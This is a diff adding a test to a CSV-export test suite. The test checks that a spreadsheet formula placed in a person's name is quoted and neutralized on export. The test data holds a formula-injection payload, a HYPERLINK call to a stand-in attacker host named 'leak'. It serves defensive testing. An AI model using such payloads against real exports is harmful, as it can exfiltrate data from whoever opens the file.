@@ -251,4 +251,24 @@ describe('exporting the roster + compliance summary', () => {
     expect(text).toContain('82.3');
     expect(await screen.findByText(/CSV downloaded/)).toBeTruthy();
   });
+
+  it('neutralizes a formula-shaped assigned person name so Excel/Sheets cannot run it on open', async () => {
+    const { createObjectURL } = stubDownload();
+    const blobParts = captureBlobParts();
+    const solution = baseSolution();
+    solution.roster_lines[0].assigned_person = '=HYPERLINK("http://evil.example/leak","click")';
+    render(
+      <ParetoExplorerView solution={solution} selectedLeewayPct={10} onSelectLeewayPct={() => {}} />
+    );
+
+    fireEvent.click(screen.getByRole('button', { name: /Export roster & compliance CSV/ }));
+
+    await waitFor(() => expect(createObjectURL).toHaveBeenCalledTimes(1));
+    const text = blobParts[0];
+
+    // Quoted, and guarded with a leading single quote inside the quotes - never a raw
+    // formula cell a spreadsheet would run on open.
+    expect(text).toContain('"\'=HYPERLINK');
+    expect(text).not.toMatch(/,=HYPERLINK/);
+  });
 });
